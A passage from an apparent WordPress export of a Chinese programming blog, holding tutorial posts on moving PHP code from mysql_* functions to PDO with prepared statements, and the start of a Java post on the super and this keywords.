		<wp:post_date_gmt><![CDATA[2016-01-08 12:51:39]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%bf%ab%e6%92%ad%e6%a1%88%e5%ba%ad%e5%ae%a1%e7%ac%91%e7%82%b9%ef%bc%88%e4%b8%80-1-%e5%85%ac%e8%af%89%e4%ba%ba%ef%bc%9a%e8%b5%b7%e8%af%89%e4%b9%a6%e4%b8%8a%e6%89%80%e8%bf%b0%e7%9a%84%e5%bf%ab]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e5%bf%ab%e6%92%ad"><![CDATA[快播]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e8%b6%a3%e9%97%bb"><![CDATA[趣闻]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[161]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>PHP教程之PDO链接MySQL数据库 0x02</title>
		<link>https://www.nervgeek.com/2016/01/10/php%e6%95%99%e7%a8%8b%e4%b9%8bpdo%e9%93%be%e6%8e%a5mysql%e6%95%b0%e6%8d%ae%e5%ba%93-0x02/</link>
		<pubDate>Sun, 10 Jan 2016 11:48:11 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=526</guid>
		<description></description>
		<content:encoded><![CDATA[<h3 id="2">2.连接MySQL</h3>

&nbsp;

<h5><strong>2.1. 以前的方式</strong></h5>

<pre>$link = mysql_connect('localhost', 'user', 'pass');
mysql_select_db('testdb', $link);
mysql_set_charset('UTF-8', $link);</pre>

&nbsp;

<h5><strong>2.2. 新的方式</strong></h5>

<ul>
<li>创建一个PDO对象，参数包括 <code>DSN</code>，<code>username</code>，<code>password</code> 和 一个驱动选项的数组（可忽略）。</li>
<li>DSN其实就是一个告诉PDO该使用哪一种数据库驱动 和 一些连接信息的字符串，了解更多 PDO MYSQL DSN .</li>
</ul>

<pre>$db = new PDO('mysql:host=localhost;dbname=testdb;charset=utf8', 'username', 'password');</pre>

<span style="color: #ff0000;"><i class="icon-warning-sign"></i><span style="font-size: 10pt;"><strong>注意：</strong></span></span><span style="font-size: 10pt; color: #993366;">确保DSN中设置了字符编码信息，否则将可能返回字符编码设置错误的信息，出于安全考虑，DSN最好包括字符编码信息设置。</span>
<!--more-->
你也可以在第四个参数数组里填写一些驱动选项，建议将 PDO异常模式（下文讲解） 和 关闭预处理模拟（默认打开的，仅对于旧版本MySQL有用）两个参数加入到第四个参数数组中。

<pre>$db = new PDO('mysql:host=localhost;dbname=testdb;charset=utf8', 'username', 'password', array(PDO::ATTR_EMULATE_PREPARES => false,PDO::ATTR_ERRMODE =>; PDO::ERRMODE_EXCEPTION));</pre>

你也可以在创建PDO对象后再通过<code>setAttribute</code>方法设置相应选项。

<pre>$db = new PDO('mysql:host=localhost;dbname=testdb;charset=utf8', 'username', 'password');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>526</wp:post_id>
		<wp:post_date><![CDATA[2016-01-10 19:48:11]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-10 11:48:11]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php%e6%95%99%e7%a8%8b%e4%b9%8bpdo%e9%93%be%e6%8e%a5mysql%e6%95%b0%e6%8d%ae%e5%ba%93-0x02]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="post_tag" nicename="pdo"><![CDATA[PDO]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[237]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>PHP教程之PDO链接MySQL数据库 0x03</title>
		<link>https://www.nervgeek.com/2016/01/12/php%e6%95%99%e7%a8%8b%e4%b9%8bpdo%e9%93%be%e6%8e%a5mysql%e6%95%b0%e6%8d%ae%e5%ba%93-0x03/</link>
		<pubDate>Tue, 12 Jan 2016 07:51:45 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=544</guid>
		<description></description>
		<content:encoded><![CDATA[<h3 id="3">3.错误处理</h3>

<h5></h5>

<h5><strong>3.1. mysql_*函数的错误处理</strong></h5>

<pre>//connected to mysql
$result = mysql_query("SELECT * FROM table", $link) or die(mysql_error($link));</pre>

<code>OR die()</code>是个不错的错误处理方法，但是会因此结束页面，将错误信息呈现到用户面前，这可能是我们不想看到的结果。
&nbsp;
<span style="color: #000000;"><strong>PDO有三种错误处理模式：</strong></span>
<span style="color: #000000;"><strong>    1、PDO::ERRMODE_SILENT #</strong> 和 mysql_*函数类似，检查代码并查看 <code>$db->errorInfo();</code> 获取详细信息。</span>
<span style="color: #000000;">    <strong>2、PDO::ERRMODE_WARNING #</strong> 抛出PHP警告。</span>
<span style="color: #000000;">    <strong>3、PDO::ERRMODE_EXCEPTION #</strong>抛出 <code>PDOException</code> 异常，在我认为，这是我们应该使用的模式， 这和<code> die(mysql_error());</code> 类似，但是它可以捕获并抛出具体异常信息。</span>
<!--more-->

<h5></h5>

<h5><strong>3.2. 代码示例</strong></h5>

<pre>try {
    //connect as appropriate as above
    $db->query('hi'); //invalid query!
} catch(PDOException $ex) {
    echo "An Error occured!"; //user friendly message
    some_logging_function($ex->getMessage());
}</pre>

<span style="color: #ff0000;"><i class="icon-warning-sign"></i><strong>注意：</strong></span>你可以不用立即执行并捕获异常，你可以在任何合适的时候随时捕获。

<pre>function getData($db) {
    $stmt = $db->query("SELECT * FROM table");
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}
//then much later
try {
    getData($db);
} catch(PDOException $ex) {
    //handle me.
}</pre>

如果你不想使用<code>try/catch</code>来处理异常，就像使用<code>OR die()</code>那样处理，在production模式下关闭<code>display_errors</code>选项即可。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>544</wp:post_id>
		<wp:post_date><![CDATA[2016-01-12 15:51:45]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-12 07:51:45]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php%e6%95%99%e7%a8%8b%e4%b9%8bpdo%e9%93%be%e6%8e%a5mysql%e6%95%b0%e6%8d%ae%e5%ba%93-0x03]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="post_tag" nicename="pdo"><![CDATA[PDO]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[205]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>PHP教程之PDO链接MySQL数据库 0x04</title>
		<link>https://www.nervgeek.com/2016/01/12/php%e6%95%99%e7%a8%8b%e4%b9%8bpdo%e9%93%be%e6%8e%a5mysql%e6%95%b0%e6%8d%ae%e5%ba%93-0x04/</link>
		<pubDate>Tue, 12 Jan 2016 08:00:29 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=549</guid>
		<description></description>
		<content:encoded><![CDATA[<h3 id="4">4.简单的查询语句（SELECT）</h3>

&nbsp;

<h5><strong>4.1. mysql代码:</strong></h5>

<pre>$result = mysql_query('SELECT * from table') or die(mysql_error());
$num_rows = mysql_num_rows($result);
while($row = mysql_fetch_assoc($result)) {
    echo $row['field1'].' '.$row['field2']; //etc...
}</pre>

<!--more-->
&nbsp;

<h5><strong>4.2. PDO代码:</strong></h5>

<pre>foreach($db->query('SELECT * FROM table') as $row) {
    echo $row['field1'].' '.$row['field2']; //etc...
}</pre>

<code>query()</code> 方法返回了一个 <code>PDOStatement</code> 对象，你可以通过如下方法获取结果:

<pre>$stmt = $db->query('SELECT * FROM table');
while($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
    echo $row['field1'].' '.$row['field2']; //etc...
}</pre>

或者

<pre>$stmt = $db->query('SELECT * FROM table');
$results = $stmt->fetchAll(PDO::FETCH_ASSOC);
//use $results</pre>

&nbsp;

<h5><strong>4.3.  Fetch Modes</strong></h5>

注意<code> fetch()</code> 和 <code>fetchAll()</code> 代码中的<code>PDO::FETCH_ASSOC</code> ，它高速 PDO 以关联数组的形式返回 键，值；其他比如<code>PDO::FETCH_NUM</code>模式，则返回数值键值的数组，默认模式是 <code>PDO::FETCH_BOTH</code> 则返回前面两者的集合，既有数值键值的数组，又有关联数组。PDO也可以获取数据返回对象<code>PDO::FETCH_OBJ</code>，<code>PDO::FETCH_CLASS</code>，<code>PDO::FETCH_BOUND</code>，<code>bindColumn</code>方法等更多内容，请阅读： PDOStatement Fetch documentation。
&nbsp;

<h5><strong>4.4.  获取数据行数（Getting Row Count）</strong></h5>

代替 <code>mysql_num_rows</code> 方法，你可以使用 <code>PDOStatement</code>对象的<code>rowCount()</code>方法。

<pre>$stmt = $db->query('SELECT * FROM table');
$row_count = $stmt->rowCount();
echo $row_count.' rows selected';</pre>

<span style="color: #ff0000;"><i class="icon-warning-sign"></i><span style="font-size: 10pt;"><strong>注意：</strong></span></span><span style="font-size: 10pt; color: #993366;">官方文档称此函数仅适用于返回 <code>UPDATE</code>，<code>INSERT</code>， <code>DELETE</code>操作的<code>affected rows</code>，而 <code>SELECT</code>操作，仅对于<code>PDO_MYSQL</code>`驱动，此函数同样适用（谨记），在操作其他数据库的时候尤其注意。</span>
&nbsp;

<h5><strong>4.5.  获取最后操作ID(Getting the Last Insert Id)</strong></h5>

mysql代码:

<pre>$result = mysql_query("INSERT INTO table(firstname, lastname) VALUES('John', 'Doe')") or die("Insert Failed ".mysql_error());
$insert_id = mysql_insert_id();</pre>

&nbsp;

<h5><strong>4.6. PDO代码:</strong></h5>

<pre>$result = $db->exec("INSERT INTO table(firstname, lastname) VAULES('John', 'Doe')");
$insertId = $db->lastInsertId();</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>549</wp:post_id>
		<wp:post_date><![CDATA[2016-01-12 16:00:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-12 08:00:29]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php%e6%95%99%e7%a8%8b%e4%b9%8bpdo%e9%93%be%e6%8e%a5mysql%e6%95%b0%e6%8d%ae%e5%ba%93-0x04]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="post_tag" nicename="pdo"><![CDATA[PDO]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[192]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>PHP教程之PDO链接MySQL数据库 0x05</title>
		<link>https://www.nervgeek.com/2016/01/12/php%e6%95%99%e7%a8%8b%e4%b9%8bpdo%e9%93%be%e6%8e%a5mysql%e6%95%b0%e6%8d%ae%e5%ba%93-0x05/</link>
		<pubDate>Tue, 12 Jan 2016 08:06:50 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=555</guid>
		<description></description>
		<content:encoded><![CDATA[<h3 id="5">5.执行 INSERT, UPDATE, DELETE 操作</h3>

<h5></h5>

<h5><strong>5.1. mysql代码:</strong></h5>

<pre>$results = mysql_query("UPDATE table SET field='value'") or die(mysql_error());
$affected_rows = mysql_affected_rows($result);
echo $affected_rows.' were affected';</pre>

&nbsp;

<h5><strong>5.2. PDO代码:</strong></h5>

<pre>$affected_rows = $db->exec("UPDATE table SET field='value'");
echo $affected_rows.' were affected'</pre>

<code>DELETE</code> ， <code>INSERT</code> 操作同样适用。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>555</wp:post_id>
		<wp:post_date><![CDATA[2016-01-12 16:06:50]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-12 08:06:50]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php%e6%95%99%e7%a8%8b%e4%b9%8bpdo%e9%93%be%e6%8e%a5mysql%e6%95%b0%e6%8d%ae%e5%ba%93-0x05]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="post_tag" nicename="pdo"><![CDATA[PDO]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[200]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>PHP教程之PDO链接MySQL数据库 0x06</title>
		<link>https://www.nervgeek.com/2016/01/12/php%e6%95%99%e7%a8%8b%e4%b9%8bpdo%e9%93%be%e6%8e%a5mysql%e6%95%b0%e6%8d%ae%e5%ba%93-0x06/</link>
		<pubDate>Tue, 12 Jan 2016 08:21:01 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=558</guid>
		<description></description>
		<content:encoded><![CDATA[<h3 id="6">6.运行带有查询参数的语句</h3>

对于 不携带任何参数的查询语句，我们可以使用 <code>query</code>方法处理<code>SELECT</code>操作，使用<code>exec</code>方法处理 <code>INSERT</code>，<code>UPDATE</code>，<code>INSERT</code>操作，而对于携带查询参数的语句，你应该使用绑定参数的方法来安全的处理这些操作。
&nbsp;

<h5><strong>6.1. mysql_*代码:</strong></h5>

<pre>$results = mysql_query(sprintf("SELECT * FROM table WHERE id='%s' AND name='%s'",
 mysql_real_escape_string($id), mysql_real_escape_string($name))) or die(mysql_error());
$rows = array();
while($row = mysql_fetch_assoc($results)){
 $rows[] = $row;
}</pre>

&nbsp;
<!--more-->

<h5><strong>6.2. PDO代码:</strong></h5>

<pre>$stmt = $db->prepare("SELECT * FROM table WHERE id=? AND name=?");
 $stmt->execute(array($id, $name));
 $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);</pre>

<code>prepare</code>方法将查询语句发送到服务器，以“？”作为参数占位符进行编译，<code>execute</code>方法将查询参数发送到服务器，运行之前编译好的查询语句。因为 <strong>查询语句</strong> 和 <strong>查询参数</strong> 是分开发送的，所以在参数里的SQL语句是不可能被执行的，所以不会发生<strong> SQL注入</strong>，这是一种比连接字符串构造SQL语句更加安全的解决方法。
<span style="color: #ff0000;"><i class="icon-warning-sign"></i><span style="font-size: 10pt;"><strong>注意：</strong></span></span><span style="color: #993366; font-size: 10pt;">当你使用<strong>绑定参数</strong>的时候，不要对"?"占位符使用引号（SQL语句原来是对参数使用引号的），因为参数类型是在<code>execute</code>方法的时候确定的，所以在<code>prepare</code>的时候不必对占位符使用引号。</span>
还有一些绑定参数的方法，<code>bindValue</code>方法可以分别绑定每个参数来代替<code>execute</code>方法的数组方式，同时还分别设置每个参数的类型。

<pre>$stmt = $db->prepare("SELECT * FROM table WHERE id=? AND name=?");
$stmt->bindValue(1, $id, PDO::PARAM_INT);
$stmt->bindValue(2, $name, PDO::PARAM_STR);
$stmt->execute();
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);</pre>

&nbsp;

<h5><strong>6.3. 命名占位符</strong></h5>

如果你有许多参数需要绑定，不要使用问号占位符，以防混淆出错，你可以使用命名占位符代替问号占位符。

<pre>$stmt = $db->prepare("SELECT * FROM table WHERE id=:id AND name=:name");
$stmt->bindValue(':id', $id, PDO::PARAM_INT);
$stmt->bindValue(':name', $name, PDO::PARAM_STR);
$stmt->execute();
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);</pre>

你也可以使用<code>execute</code>方法，以数组的方式绑定参数：

<pre>$stmt = $db->prepare("SELECT * FROM table WHERE id=:id AND name=:name");
$stmt->execute(array(':name' => $name, ':id' => $id));
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);</pre>

&nbsp;

<h5><strong>6.4. INSERT, DELETE, UPDATE 预处理查询</strong></h5>

<code>INSERT</code>, <code>DELETE</code>, <code>UPDATE</code> 预处理语句的使用和<code>SELECT</code>类似，我们举几个例子：

<pre>$stmt = $db->prepare("INSERT INTO table(field1,field2,field3,field4,field5) VALUES(:field1,:field2,:field3,:field4,:field5)");
$stmt->execute(array(':field1' => $field1, ':field2' => $field2, ':field3' => $field3, ':field4' => $field4, ':field5' => $field5));
$affected_rows = $stmt->rowCount();
$stmt = $db->prepare("DELETE FROM table WHERE id=:id");
$stmt->bindValue(':id', $id, PDO::PARAM_STR);
$stmt->execute();
$affected_rows = $stmt->rowCount();
$stmt = $db->prepare("UPDATE table SET name=? WHERE id=?");
$stmt->execute(array($name, $id));
$affected_rows = $stmt->rowCount();</pre>

&nbsp;
&nbsp;

<h5><strong>6.5. 在预处理中使用SQL函数</strong></h5>

=>无效方法：

<pre>//THIS WILL NOT WORK!
$time = 'NOW()';
$name = 'BOB';
$stmt = $db->prepare("INSERT INTO table(`time`, `name`) VALUES(?, ?)");
$stmt->execute(array($time, $name));</pre>

=>正确方法

<pre>$name = 'BOB';
$stmt = $db->prepare("INSERT INTO table(`time`, `name`) VALUES(NOW(), ?)");
$stmt->execute(array($name));</pre>

=>你也可以在SQL函数里绑定参数：

<pre>$name = 'BOB';
$password = 'badpass';
$stmt = $db->prepare("INSERT INTO table(`hexvalue`, `password`) VALUES(HEX(?), PASSWORD(?))");
$stmt->execute(array($name, $password));</pre>

=>但是不能作为<code>LIKE</code>的参数：

<pre>//THIS DOES NOT WORK
$stmt = $db->prepare("SELECT field FROM table WHERE field LIKE %?%");
$stmt->bindParam(1, $search, PDO::PARAM_STR);
$stmt->execute();</pre>

=>正确使用<code>LIKE</code>并绑定参数的方法：

<pre>$stmt = $db->prepare("SELECT field FROM table WHERE field LIKE ?");
$stmt->bindValue(1, "%$search%", PDO::PARAM_STR);
$stmt->execute();</pre>

<span style="color: #ff0000;"><i class="icon-warning-sign"></i><span style="font-size: 10pt;"><strong>注意：</strong></span></span><span style="font-size: 10pt; color: #993366;">这里使用的是<code>bindValue</code>而不是<code>bindParam</code>，否则会发生<code>PDOException</code>或致命错误。</span>
&nbsp;

<h5><strong>6.6. 使用循环运行预处理语句</strong></h5>

预处理语句可以一次设置，多次调用，因为仅在第一次传入的时候编译，因此在后来的多次调用中提高了不少效率。
典型的应用就是<code>bindParam</code>，<code>bindParam</code>与<code>bindValue</code>的不同之处在于，它不是绑定了参数的值，而是绑定参数变量本身，因此，如果参数变量变化了，那么在execute处理的时候，查询也将相应变化。

<pre>$values = array('bob', 'alice', 'lisa', 'john');
$name = '';
$stmt = $db->prepare("INSERT INTO table(`name`) VALUES(:name)");
$stmt->bindParam(':name', $name, PDO::PARAM_STR);
foreach($values as $name) {
 $stmt->execute();
}</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>558</wp:post_id>
		<wp:post_date><![CDATA[2016-01-12 16:21:01]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-12 08:21:01]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php%e6%95%99%e7%a8%8b%e4%b9%8bpdo%e9%93%be%e6%8e%a5mysql%e6%95%b0%e6%8d%ae%e5%ba%93-0x06]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="post_tag" nicename="pdo"><![CDATA[PDO]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[262]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中的super和this关键字</title>
		<link>https://www.nervgeek.com/2016/01/15/java%e4%b8%ad%e7%9a%84super%e5%85%b3%e9%94%ae%e5%ad%97/</link>
		<pubDate>Fri, 15 Jan 2016 06:50:36 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=610</guid>
		<description></description>
		<content:encoded><![CDATA[suoer关键字用法一：

<pre>class Person{ 
    public int c; 
    private String name; 
    private int age; 
    protected void setName(String name){ 
        this.name=name; 
    } 
    protected void setAge(int age){ 
        this.age=age; 
    } 
    protected void print(){ 
        System.out.println("Name="+name+" Age="+age); 
    } 
}
public class DemoSuper extends Person{ //继承Person
    public void print(){ 
        System.out.println("DemoSuper:"); 
        super.print(); //虽然本方法重写了父类的print，但还是调用父类的print方法。
    } 
    public static void main(String[] args){ 
        DemoSuper ds=new DemoSuper(); 
        ds.setName("kevin"); 
        ds.setAge(22); 
        ds.print(); 
    } 
}</pre>

<!--more-->在DemoSuper中，重新定义的print方法覆写了父类的print方法，它首先做一些自己的事情，然后调用父类的那个被覆写了的方法。输出结果说明了这一点：
<code>DemoSuper:</code>
<code> Name=kevin Age=22</code>
&nbsp;
修改这段程序，表示this的用法：

<pre>public class DemoThis{ 
    private String name; 
    private int age; 
    DemoThis(String name,int age){ 
        setName(name); 
        //你可以加上this来调用方法，像这样：this.setName(name);但这并不是必须的 
        setAge(age); 
        this.print(); 
    } 
    public void setName(String name){ 
        this.name=name;//此处必须指明你要引用成员变量 
    } 
    public void etAge(int age){ 
        this.age=age; 
    } 
    public void print(){ 
        System.out.println("Name="+name+" Age="+age); 
        //在此行中并不需要用this，因为没有会导致混淆的东西 
    } 
    public static void main(String[] args){ 
        DemoThis dt=new DemoThis("Kevin",22); 
    }
}</pre>

输出结果：
<code>Name=kevin Age=22</code>
&nbsp;
在构造函数中构造函数是一种特殊的方法，在对象初始化的时候自动调用。在构造函数中，this和super也有上面说的种种使用方式，并且它还有特殊的地方，请看下面的例子：

<pre>class Person {
    public static void prt(String s) {
        System.out.println(s);
    }
    Person() {
        prt("A Person.");
    }
    Person(String name) {
        prt("A person name is:" + name);
    }
}
public class Chinese extends Person {
    Chinese() {
        super(); // 调用父类构造函数（1）
        prt("A chinese.");// (4)
        prt("______");
    }
    Chinese(String name) {
        super(name);// 调用父类具有相同形参的构造函数（2）
        prt("his name is:" + name);
